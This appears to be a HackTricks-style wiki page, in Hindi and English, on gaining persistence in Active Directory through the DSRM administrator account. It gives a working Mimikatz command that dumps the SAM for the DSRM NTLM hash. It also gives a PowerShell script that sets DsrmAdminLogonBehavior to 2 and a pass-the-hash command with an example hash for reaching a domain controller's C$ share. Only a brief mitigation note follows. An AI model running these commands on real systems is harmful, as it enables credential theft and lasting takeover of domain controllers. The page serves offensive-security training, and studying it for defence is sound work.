# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

हर domain controller में एक Directory Services Restore Mode (DSRM) administrator account होता है। इसका password domain-controller promotion के दौरान set किया जाता है और यह Active Directory domain accounts से अलग होता है।<sup>[[1]](#references)</sup>

किसी domain controller पर administrative control रखने वाला attacker local SAM database को dump करके DSRM Administrator NTLM hash recover कर सकता है। निम्नलिखित Mimikatz command यह operation perform करती है:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
डिफ़ॉल्ट रूप से, DSRM account restore mode के लिए intended होता है। `DsrmAdminLogonBehavior` को `2` पर सेट करने से यह local account domain controller के सामान्य रूप से चलने के दौरान authenticate कर सकता है। इसे बदलने से पहले value check करें:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
प्राप्त hash का उपयोग pass-the-hash session में administrative `C$` share जैसे resources तक पहुंचने के लिए किया जा सकता है। इस local account के लिए `/domain` value के रूप में domain controller के computer name का उपयोग करें:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## शमन

- `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` में किए गए बदलावों का audit करें। Security event 4657 registry value में बदलाव को तब रिकॉर्ड करता है, जब key का SACL **Set Value** operations का audit करने के लिए configured हो।<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Directory Services Restore Mode administrator password रीसेट करें](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Sneaky Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Sneaky Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Event 4657 — एक registry value में बदलाव किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
